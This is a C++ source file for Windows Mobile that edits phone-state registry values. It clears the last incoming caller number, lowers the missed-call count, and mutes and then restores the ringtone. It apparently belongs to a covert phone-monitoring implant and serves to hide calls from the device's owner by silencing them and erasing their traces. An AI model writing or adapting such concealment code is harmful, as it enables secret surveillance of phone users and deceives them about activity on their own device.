#include <Windows.h>
#include "Registry.h"
#include "Common.h"

BOOL Registry::RegRemoveLastCaller()
{
	return RegWriteString(HKEY_LOCAL_MACHINE, L"System\\State\\Phone", L"Last Incoming Caller Number", L"");
}


BOOL Registry::RegMissedCallDecrement()
{
	LONG lOut = 0;
	HKEY hKeyPhone;
	DWORD dwType = 0, cbData = 0; 
	DWORD dwValue = 0;
	WCHAR wsValueName[] = L"Missed Call Count";

	cbData = sizeof(DWORD);

	if (cbData == 0)
		return FALSE;

	if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER, L"System\\State\\Phone", 0, 0, &hKeyPhone))
		return FALSE;

	lOut = RegQueryValueEx(hKeyPhone, wsValueName, NULL, &dwType, (LPBYTE)&dwValue, &cbData);

	if (lOut != ERROR_SUCCESS && lOut == ERROR_MORE_DATA) {

		lOut = RegQueryValueEx(hKeyPhone, wsValueName, NULL, &dwType, (LPBYTE)&dwValue, &cbData);

		if (lOut != ERROR_SUCCESS) {
			RegCloseKey(hKeyPhone);
			return FALSE;
		}
	}
	
	DBG_TRACE_INT(L"Registry.cpp RegMissedCallDecrement:", 5, FALSE, (INT)dwValue);
	if (dwValue > 0) {
		dwValue--;
	}

	RegSetValueEx(hKeyPhone, wsValueName, 0, dwType, (LPBYTE) &dwValue, cbData);

	RegFlushKey(hKeyPhone);
	RegCloseKey(hKeyPhone);

	return TRUE;
}

BOOL Registry::SetRingScript()
{
	wsRingToneStore = RegReadStringStd(HKEY_CURRENT_USER, wsRingTone0, wsRingToneValueName);
	if (wsRingToneStore.empty())
		wsRingToneStore.assign(L"apw3r");

	if (RegWriteString(HKEY_CURRENT_USER, 
						(WCHAR*)wsRingTone0.c_str(),
						(WCHAR*)wsRingToneValueName.c_str(),
						(WCHAR*)wsRingToneMute.c_str())) {
		m_bRingToneScriptModified = TRUE;
		return TRUE;
	}
	
	return FALSE;
}

BOOL Registry::RestoreRingScript()
{
	if (!m_bRingToneScriptModified)
		wsRingToneStore.assign(L"apw3r");

	if (RegWriteString(HKEY_CURRENT_USER,
						(WCHAR*)wsRingTone0.c_str(),
						(WCHAR*)wsRingToneValueName.c_str(),
						(WCHAR*)wsRingToneStore.c_str()))
		return TRUE;
	
	return FALSE;
}

BOOL Registry::RegReadString(HKEY uKey, WCHAR* wsKeyName, WCHAR* wsValueName, WCHAR** wszKeyValue)
{
	BOOL bOut = FALSE;
	LONG lOut = 0;
	HKEY hKey;
	DWORD dwType = 0, cbData = 0;

	if (ERROR_SUCCESS != RegOpenKeyEx(uKey, wsKeyName, 0, 0, &hKey))
		return FALSE;

	lOut = RegQueryValueEx(hKey, wsValueName, NULL, &dwType, NULL, &cbData);
	if (lOut == ERROR_SUCCESS) {

		if (cbData > 0) {

			UINT uStrLen = cbData/sizeof(WCHAR);

			*wszKeyValue = new(nothrow) WCHAR[uStrLen];

			lOut = RegQueryValueEx(hKey, wsValueName, NULL, &dwType, (LPBYTE) *wszKeyValue, &cbData);

			if (lOut != ERROR_SUCCESS) {
				RegCloseKey(hKey);
				return bOut;
			}
		}

		bOut = TRUE;
	}

	RegCloseKey(hKey);

	return bOut;
}

wstring Registry::RegReadStringStd(HKEY uKey, wstring wsKeyName, wstring wsValueName)
{
	BOOL bOut = FALSE;
	LONG lOut = 0;
	HKEY hKey;
	DWORD dwType = 0, cbData = 0;
	WCHAR* wsTmp = L"";

	HRESULT hr = RegOpenKeyExW(uKey, wsKeyName.c_str(), 0, 0, &hKey);
	if (hr != ERROR_SUCCESS) {
		return wstring(L"");
	}

	lOut = RegQueryValueEx(hKey, wsValueName.c_str(), NULL, &dwType, NULL, &cbData);
	if (lOut == ERROR_SUCCESS) {

		if (cbData > 0) {

			UINT uStrLen = cbData/sizeof(WCHAR);

			wsTmp = new(std::nothrow) WCHAR[uStrLen];

			lOut = RegQueryValueEx(hKey, wsValueName.c_str(), NULL, &dwType, (LPBYTE) wsTmp, &cbData);

			if (lOut != ERROR_SUCCESS) {
				RegCloseKey(hKey);
				return wstring(L"");
			}
		}
		bOut = TRUE;
	}

	RegCloseKey(hKey);

	return wstring(wsTmp);
}

BOOL Registry::RegWriteString(HKEY uKey, WCHAR* wsKeyName, WCHAR* wsValueName, WCHAR* wszKeyValue)
{
	BOOL bOut = FALSE;
	LONG lOut = 0;		   
	HKEY hKey;
	DWORD dwType = 0, cbData = 0;

	if (FAILED(StringCchLength(wszKeyValue, 1024, (size_t*)&cbData))) {
		return bOut;
	}

	if (ERROR_SUCCESS != RegOpenKeyEx(uKey, wsKeyName, 0, 0, &hKey))
		return bOut;

	lOut = RegSetValueEx(hKey, wsValueName, 0, REG_SZ, (LPBYTE) wszKeyValue, (cbData+1)*sizeof(WCHAR));

	if (lOut != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return bOut;
	} 	

	RegFlushKey(hKey);
	RegCloseKey(hKey);

	return bOut = TRUE;
}

Registry* Registry::Instance = NULL;
volatile LONG Registry::lLock = 0;

Registry* Registry::self() {
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) Registry();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

Registry::Registry(void)
{
	m_bRingToneScriptModified = FALSE;

	wsRingTone0 = L"ControlPanel\\Sounds\\RingTone0";
	wsRingToneValueName = L"Script";
	wsRingToneMute = L"a";
	wsRingToneStore = L"apw3r";

}

Registry::~Registry(void)
{
}
